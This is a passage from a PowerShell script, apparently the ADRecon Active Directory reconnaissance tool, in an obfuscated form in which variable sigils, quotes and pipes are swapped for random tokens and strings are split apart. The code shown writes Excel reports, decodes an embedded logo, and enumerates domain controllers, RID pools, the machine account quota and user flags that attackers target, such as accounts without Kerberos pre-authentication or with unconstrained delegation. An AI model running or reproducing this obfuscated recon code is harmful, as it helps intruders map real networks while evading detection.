            Get-ADRExcelAttributeStats -SrcSheetName I2ajComputersI2aj -Title1 I2ajComputer Accounts in ADI2aj -PivotTableName I2ajComputer Accounts StatusI2aj -PivotRows I2ajEnabledI2aj -PivotValues I2ajUserNameI2aj -PivotPercentage I2ajUserNameI2aj -Title2 I2ajStatus of Computer AccountsI2aj -ObjAttributes 5I7ELObjAttributes
            Remove-Variable ObjAttributes

            Get-ADRExcelChart -ChartType I2ajxlPieI2aj -ChartLayout 3 -ChartTitle I2ajComputer Accounts in ADI2aj -RangetoCover I2ajA11:D23I2aj -ChartData 5I7ELworkbook.Worksheets.Item(1).Range(I2ajA3:A4,B3:B4I2aj)
            5I7ELworkbook.Worksheets.Item(1).Hyperlink'+'s.Add(5I7ELworkbook.Worksheets.Item(1).Cells.Item(10,1) , I2ajI2aj , I2ajComputers!A1I2aj, I2ajI2aj, I2ajRaw DataI2aj) Ok6rl Out-Null

            Get-ADRExcelChart -ChartType I2ajxlBarClusteredI2aj -ChartLayout 1 -ChartTitle I2ajStatus of Computer AccountsI2aj -RangetoCover I2ajF11:L23I2aj -ChartData 5I7ELworkbook.Worksheets.Item(1).Range(I2ajF2:F8,G2:G8I2aj)
            5I7ELworkbook.Worksheets.Item(1).Hyperlinks.Add(5I7ELworkbook.Worksheets.Item(1).Cells.Item(10,6) , I2ajI2aj , I2ajComputers!A1I2aj, I2ajI2aj, I2ajRaw DataI2aj) Ok6rl Out-Null

            5I7ELworkbook.Worksheets.Item(1).UsedRange.EntireColumn.AutoFit() Ok6rl Out-Null
            5I7ELexcel.Windows.Item(1).Displaygridlines = 5I7ELfalse
        }

        
        5I7ELADFileName = -join(5I7ELReportPath,JQTOyCOlhgJQTOy,JQTOyUsers.csvJQTOy)
        If (Test-Path 5I7ELADFileName)
        {
            Get-ADRExcelWorkbook -Name I2ajUser StatsI2aj
            Remove-Variable ADFileName

            5I7ELObjAttributes = New-Object System.Collections.Specialized.Order'+'edDictionary
            5I7ELObjAttributes.Add(I2ajMust Change Password at LogonI2aj,JQTOyI2ajTRUEI2ajJQTOy)
            5I7ELObjAttributes.Add(I2ajCannot Change PasswordI2aj,JQTOyI2aj'+'TRUEI2ajJQTOy)
            5I7ELObjAttributes.Add(I2ajPassword Never ExpiresI2aj,JQTOyI2ajTRUEI2ajJQTOy)
            5I7ELObjAttributes.Add(I2ajReversible Password EncryptionI2aj,JQTOyI2ajTRUEI2ajJQTOy)
            5I7ELObjAttributes.Add(I2ajSmartcard Logon RequiredI2aj,JQTOyI2ajTRUEI2ajJQTOy)
            5I7ELObjAttributes.Add(I2ajDelegation PermittedI2aj,JQTOyI2ajTRUEI2ajJQTOy)
            5I7ELObjAttributes.Add(I2ajKerberos DES OnlyI2aj,JQTOyI2ajTRUEI2ajJQTOy)
            5I7ELObjAttributes.Add(I2ajKerberos RC4I2aj,JQTOyI2ajTRUEI2ajJQTOy)
            5I7ELObjAttributes.Add(I2ajDoes Not Require Pre AuthI2aj,JQTOyI2ajTRUEI2ajJQTOy)
            5I7ELObjAttributes.Add(I2ajPassword Age (> I2aj,JQTOyI2ajTRUEI2ajJQTOy)
            5I7ELObjAttributes.Add(I2ajAccount Locked OutI2aj,JQTOyI2ajTRUEI2ajJQTOy)
            5I7ELObjAttributes.Add(I2ajNever Logged inI2aj,JQTOyI2ajTRUEI2ajJQTOy)
            5I7ELObjAttributes.Add(I2ajDormantI2aj,JQTOyI2ajTRUEI2ajJQTOy)
            5I7ELObjAttributes.Add(I2ajPassword Not RequiredI2aj,JQTOyI2ajTRUEI2ajJQTOy)
            5I7ELObjAttributes.Add(I2ajDelegation TypI2aj,JQTOyI2ajUnconstrainedI2ajJQTOy)
            5I7ELObjAttributes.Add(I2ajSIDHistoryI2aj,JQTOyI2aj*I2ajJQTOy)

            Get-ADRExcelAttributeStats -SrcSheetName I2ajUsersI2aj -Title1 I2ajUser Accounts in ADI2aj -PivotTableName I2ajUser Accounts StatusI2aj -PivotRows I2ajEnabledI2aj -P'+'ivotValues I2ajUserNameI2aj -PivotPercentage I2ajUserNameI2aj -Title2 I2ajStatus of User AccountsI2aj -ObjAttributes 5I7ELObjAttributes
            Remove-Variable ObjAttributes

            Get-ADRExcelChart -ChartType I2ajxlPieI2aj -ChartLayout 3 -ChartTitle I2ajUser Accounts in ADI2aj -RangetoCover I2ajA21:D33I2aj -ChartData 5I7ELworkbook.Worksheets.Item(1).Range(I2ajA3:A4,B3:B4I2aj)
            5I7ELworkbook.Worksheets.Item(1).Hyperlinks.Add(5I7ELworkbook.Worksheets.Item(1).Cells.Item(20,1) , I2ajI2aj , I2ajUsers!A1I2aj, I2ajI2aj, I2ajRaw DataI2aj) Ok6rl Out-Null

            Get-ADRExcelChart -ChartType I2ajxlBarClusteredI2aj -ChartLayout 1 -ChartTitle I2ajStatus of User AccountsI2aj -RangetoCover I2ajF21:L43I2aj -ChartData 5I7ELworkbook.Worksheets.Item(1).Range(I2ajF2:F18,G2:G18I2aj)
            5I7ELworkbook.Worksheets.Item(1).Hyperlinks.Add(5I7ELworkbook.Worksheets.Item(1).Cells.Item(20,6) , I2ajI2aj , I2ajUsers!A1I2aj, I2ajI2aj, I2ajRaw DataI2aj) Ok6rl Out-Null

            5I7ELworkbook.Worksheets.Item(1).UsedRange.EntireColumn.AutoFit() Ok6rl Out-Null
            5I7ELexcel.Windows.Item(1).Displaygridlines = 5I7ELfalse
        }

        
        Get-ADRExcelWorkbook -Name I2ajTable of ContentsI2aj
        5I7ELworksheet = 5I7ELworkbook.Worksheets.Item(1)

        5I7ELexcel.ScreenUpdating = 5I7ELfalse
        
        
        

		5I7ELbase64adrecon = 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

        5I7ELbytes = [System.Convert]::FromBase64String(5I7ELbase64adrecon)
        Remove-Variable base64adrecon

        5I7ELCompanyLogo = -join(5I7ELReportPath,JQTOyCOlhgJQTOy,JQTOyADRecon_Logo.jpgJQTOy)
		5I7ELp = New-Object IO.MemoryStream(5I7ELbytes, 0, 5I7ELbytes.length)
		5I7ELp.Write(5I7ELbytes, 0, 5I7ELbytes.length)
        Add-Type -AssemblyName System.Drawing
		5I7ELpicture = [System.Drawing.Image]::FromStream(5I7ELp, 5I7ELtrue)
		5I7ELpicture.Save(5I7ELCompanyLogo)

        Remove-Variable bytes
        Remove-Variable p
        Remove-Variable picture

        5I7ELLinkToFile = 5I7ELfalse
        5I7ELSaveWithDocument = 5I7ELtrue
        5I7ELLeft = 0
        5I7ELTop = 0
        5I7ELWidth = 150
        5I7ELHeight = 50

        
        5I7ELworksheet.Shapes.AddPicture(5I7ELCompanyLogo, 5I7ELLinkToFile, 5I7ELSaveWithDocument, 5I7ELLeft, 5I7ELTop, 5I7ELWidth, 5I7ELHeight) Ok6rl Out-Null

        Remove-Variable LinkToFile
        Remove-Variable SaveWithDocument
        Remove-Variable Left
        Remove-Variable Top
        Remove-Variable Width
        Remove-Variable Height

        If (Test-Path -Path 5I7ELCompanyLogo)
        {
            Remove-Item 5I7ELCompanyLogo
        }
        Remove-Variable CompanyLogo

        5I7ELrow = 5
        5I7ELcolumn = 1
        5I7ELworksheet.Cells.Item(5I7ELrow,5I7ELcolumn)= I2ajTable of ContentsI2aj
        5I7ELworksheet.Cells.Item(5I7ELrow,5I7ELcolumn).Style = I2ajHeading 2I2aj
        5I7ELrow++

        For(5I7ELi=2; 5I7ELi -le 5I7ELworkbook.Worksheets.Count; 5I7ELi++)
        {
            5I7ELworkbook.Worksheets.Item(1).Hyperlinks.Add(5I7ELworkbook.Worksheets.Item(1).Cells.Item(5I7ELrow,5I7ELcolumn) , I2ajI2aj , I2ajJQTOy5I7EL(5I7ELworkbook.Worksheets.Item(5I7ELi).Name)JQTOy!A1I2aj, I2ajI2aj, 5I7ELworkbook.Worksheets.Item(5I7ELi).Name) Ok6rl Out-Null
            5I7ELrow++
        }

        5I7ELrow++
		5I7ELworkbook.Work'+'sheets.Item(1).Hyperlinks.Add(5I7ELworkbook.Worksheets.Item(1).Cells.Item(5I7ELrow,1) , I2ajhttps://github.com/adrecon/ADReconI2aj, I2ajI2aj , I2ajI2aj, I2ajgithub.com/adrecon/ADReconI2aj) Ok6rl Out-Null

        5I7ELworksheet.UsedRange.EntireColumn.AutoFit() Ok6rl Out-Null

        5I7ELexcel.Windows.Item(1).Displaygridlines = 5I7ELfalse
        5I7ELexcel.ScreenUpdating = 5I7ELtrue
        5I7ELADStatFileName = -join(5I7ELExcelPath,JQTOyCOlhgJQTOy,5I7ELDomainName,JQTOyADRecon-Report.xlsxJQTOy)
        Try
        {
            
            5I7ELexcel.DisplayAlerts = 5I7ELFalse
            5I7ELworkbook.SaveAs(5I7ELADStatFileName)
            Write-Output I2aj[+] Excelsheet Saved to: 5I7ELADStatFileNameI2aj
        }
        Catch
        {
            Write-Error I2aj[EXCEPTION] 5I7EL(5I7EL_.Exception.Message)I2aj
        }
        5I7ELexcel.Quit()
        Get-ADRExcelComObjRelease -ComObjtoRelease 5I7ELworksheet -Final 5I7ELtrue
        Remove-Variable worksheet
        Get-ADRExcelComObjRelease -ComObjtoRelease 5I7ELworkbook -Final 5I7ELtrue
        Remove-Variable -Name workbook -Scope Global
        Get-ADRExcelComObjRelease -ComObjtoRelease 5I7ELexcel -Final 5I7ELtrue
        Remove-Variable -Name excel -Scope Global
    }
}

Function Get-ADRDomain
{

    param(
        [Parameter(Mandatory = 5I7ELtrue)]
        [string] 5I7ELMethod,

        [Parameter(Mandatory = 5I7ELfalse)]
        [DirectoryServices.DirectoryEntry] 5I7ELobjDomain,

        [Parameter(Mandatory = 5I7ELfalse)]
        [DirectoryServices.DirectoryEntry] 5I7ELobjDomainRootDSE,

        [Parameter(Mandatory = 5I7ELfalse)]
        [string] 5I7ELDomainController,

      '+'  [Parameter(Mandatory = 5I7ELfalse)]
        [Management.Automation.PSCredential] 5I7ELCredential = [Management.Automation.PSCredential]::Empty
    )

    If (5I7ELMethod -eq JQTOyADWSJQTOy)
    {
        Try
        {
            5I7ELADDomain ='+' Get-ADDomain
        }
        Catch
        {
            Write-Warning I2aj[Get-ADRDomain] Error getting Domain ContextI2aj
            Write-Verbose I2aj[EXCEPTION] 5I7EL(5I7EL_.Except'+'ion.Message)I2aj
            Return 5I7ELnull
        }
        If (5I7ELADDomain)
        {
            5I7ELDomainObj = @()

            
            5I7ELFLAD = @{
	            0 = I2ajWindows2000I2aj;
	            1 = I2ajWindows2003/InterimI2aj;
	            2 = I2ajWindows2003I2aj;
	            3 = I2ajWindows2008I2aj;
	            4 = I2ajWindows2008R2I2aj;
	            5 = I2ajWindows2012I2aj;
	            6 = I2ajWindows2012R2I2aj;
	            7 = I2ajWindows2016I2aj
            }
            5I7ELDomainMode = 5I7ELFLAD[[convert]::ToInt32(5I7ELADDomain.DomainMode)] + I2ajDomainI2aj
            Remove-Variable FLAD
            If (-Not 5I7ELDomainMode)
            {
                5I7ELDomainMode = 5I7ELADDomain.DomainMode
            }

            5I7ELObjValues = @(I2ajNameI2aj, 5I7ELADDomain.DNSRoot, I2ajNetBIOSI2aj, 5I7ELADDomain.NetBIOSName, I2ajFunctional LevelI2aj, 5I7ELDomainMode, I2ajDomainSIDI2aj, 5I7ELADDomain.DomainSID.Value)

            For (5I7ELi = 0; 5I7ELi -lt 5I7EL(5I7ELObjValues.Count); 5I7ELi++)
            {
                5I7ELObj = New-Object PSObject
                5I7ELObj Ok6rl Add-Member -MemberType NoteProperty -Name I2ajCategoryI2aj -Value 5I7ELObjValues[5I7ELi]
                5I7ELObj Ok6rl Add-Member -MemberType NoteProperty -Name I2ajValueI2aj -Value 5I7ELObjValues[5I7ELi+1]
                5I7ELi++
                5I7ELDomainObj += 5I7ELObj
            }
            Remove-Variable DomainMode

            For(5I7ELi=0; 5I7ELi -lt 5I7ELADDomain.ReplicaDirectoryServers.Count; 5I7ELi++)
            {
                5I7ELObj = New-Object PSObject
                5I7ELObj Ok6rl Add-Member -MemberType NoteProperty -Name I2ajCategoryI2aj -Value I2ajDomain ControllerI2aj
                5I7ELObj Ok6rl Add-Member -MemberType NoteProperty -Name I2ajValueI2aj -Value 5I7ELADDomain.ReplicaDirectoryServers[5I7ELi]
                5I7ELDomainObj += 5I7ELObj
            }
            For(5I7ELi=0; 5I7ELi -lt 5I7ELADDomain.ReadOnlyReplicaDirectoryServers.Count; 5I7ELi++)
            {
                5I7ELObj = New-Object PSObject
                5I7ELObj Ok6rl Add-Member -MemberType NoteProperty -Name I2ajCategoryI2aj -Value I2ajRead Only Domain ControllerI2aj
                5I7ELObj Ok6rl Add-Member -MemberType NoteProperty -Name I2ajValu'+'eI2aj -Value 5I7ELADDomain.ReadOnlyReplicaDirectoryServers[5I7ELi]
                5I7ELDomainObj += 5I7ELObj
            }

            Try
            {
                5I7ELADForest = Get-ADForest 5I7ELADDomain.Forest
            }
            Catch
            {
                Write-Verbose I2aj[Get-ADRDomain] Error getting Forest ContextI2aj
                Write-Verbose I2aj[EXCEPTION] 5I7EL(5I7EL_.Exception.Message)I2aj
            }

            If (-Not 5I7ELADForest)
            {
                Try
                {
                    5I7ELADForest = Get-ADForest -Server 5I7ELDomainController
                }
                Catch
                {
                    Write-Warning I2aj[Get-ADRDomain] Error getting Forest ContextI2aj
                    Write-Verbose I2aj[EXCEPTION] 5I7EL(5I7EL_.Exception.Message)I2aj
                }
            }
            If (5I7ELADForest)
            {
                5I7ELDomainCreation = Get-ADObject -SearchBase I2aj5I7EL(5I7ELADForest.PartitionsContainer)I2aj -LDAPFilter I2aj(&(objectClass=crossRef)(systemFlags=3)(Name=5I7EL(5I7ELADDomain.Name)))I2aj -Properties whenCreated
                If (-Not 5I7ELDomainCreation)
                {
                    5I7ELDomainCreation = Get-ADObject -SearchBase I2aj5I7EL(5I7ELADForest.PartitionsContainer)I2aj -LDAPFilter I2aj(&(objectClass=crossRef)(systemFlags=3)(Name=5I7EL(5I7ELADDomain.NetBIOSName)))I2aj -Properties whenCreated
                }
                Remove-Variable ADForest
            }
            
            Try
            {
                5I7ELRIDManager = Get-ADObject -Identity I2ajCN=RID Manager5I7EL,CN=System,5I7EL(5I7ELADDomain.DistinguishedName)I2aj -Properties rIDAvailablePool
                5I7ELRIDproperty = 5I7ELRIDManager.rIDAvailablePool
                [int32] 5I7ELtotalSIDS = 5I7EL(5I7ELRIDproperty) / ([math]::Pow(2,32))
                [int64] 5I7ELtemp64val = 5I7ELtotalSIDS * ([math]::Pow(2,32))
                5I7ELRIDsIssued = [int32](5I7EL(5I7ELRIDproperty) - 5I7ELtemp64val)
                5I7ELRIDsRemaining = 5I7ELtotalSIDS - 5I7ELRIDsIssued
                Remove-Variable RIDManager
                Remove-Variable RIDproperty
                Remove-Variable totalSIDS
                Remove-Variable temp64val
            }
            Catch
            {
                Write-Warning I2aj[Get-ADRDomain] Error accessing CN=RID Manager5I7EL,CN=System,5I7EL(5I7ELADDomain.DistinguishedName)I2aj
                Write-Verbose I2aj[EXCEPTION] 5I7EL(5I7EL_.Exception.Message)I2aj
            }
            If (5I7ELDomainCreation)
            {
                5I7ELObj = New-Object PSObject
           '+'     5I7ELObj Ok6rl Add-Member -MemberType NoteProperty -Name I2ajCategoryI2aj -Value I2ajCreation DateI2aj
                5I7ELObj Ok6rl Add-Member -MemberType NoteProperty -Name I2ajValueI2aj -Value 5I7ELDomainCreation.whenCreated
                5I7ELDomainObj += 5I7ELObj
                Remove-Variable DomainCreation
            }

            5I7ELObj = New-Object PSObject
            5I7ELObj Ok6rl Add-Member -MemberType NoteProperty -Name I2ajCategoryI2aj -Value I2ajms-DS-MachineAccountQuotaI2a'+'j
            5I7ELObj Ok6rl Add-Member -MemberType NoteProperty -Name I2ajValueI2aj -Value 5I7EL((Get-ADObject -Identity (5I7ELADDomain.DistinguishedName) -Properties ms-DS-MachineAccountQuota).JQTOyms-DS-MachineAccountQuotaJQTOy)
            5I7ELDomainObj += 5I7ELObj

            If (5I7ELRIDsIssued)
            {
                5I7ELObj = New-Object PSObject
                5I7ELObj Ok6rl Add-Member -MemberType NoteProperty -Name I2ajCategoryI2aj -Value I2ajRIDs IssuedI2aj
                5I7ELObj Ok6rl Add-Member -MemberType NoteProperty -Name I2ajValueI2aj -Value 5I7ELRIDsIssued
                5I7ELDomainObj += 5I7ELObj
                Remove-Variable RIDsIssued
            }
            If (5I7ELRIDsRemaining)
            {
                5I7ELObj = New-Object PSObject
                5I7ELObj Ok6rl Add-Member -MemberType NoteProperty -Name I2ajCategoryI2aj -Value I2ajRIDs RemainingI2aj
                5I7ELObj Ok6rl Add-Member -MemberType NoteProperty -Name I2ajValueI2aj -Value 5I7ELRIDsRemaining
                5I7ELDomainObj += 5I7ELObj
                Remove-Variable RIDsRemaining
            }
        }
    }

    If (5I7ELMethod -eq JQTOyLDAPJQTOy)
    {
        If (5I7ELCredential -ne [Management.Automation.PSCredential]::Empty)
        {
            5I7ELDomainFQDN = Get-DNtoFQDN(5I7ELobjDomain.distinguishedName)
            5I7ELDomainContext = New-Object System.DirectoryServices.ActiveDirectory.DirectoryContext(I2ajDomainI2aj,5I7EL(5I7ELDomainFQDN),5I7EL(5I7ELCredential.UserName),5I7EL(5I7ELCredential.GetNetworkCredential().password))
            Try
            {
                5I7ELADDomain = [System.DirectoryServices.ActiveDirectory.Domain]::GetDomain(5I7ELDomainContext)
            }
            Catch
            {
                Write-Warning I2aj[Get-ADRDomain] Error getting Domain ContextI2aj
                Write-Verbose I2aj[EXCEPTION] 5I7EL(5I7EL_.Exception.Message)I2aj
                Return 5I7ELnull
            }
            Remove-Variable DomainContext
            
            Try
            {
                5I7ELSearchPath = I2ajCN=RID Manager5I7EL,CN=SystemI2aj
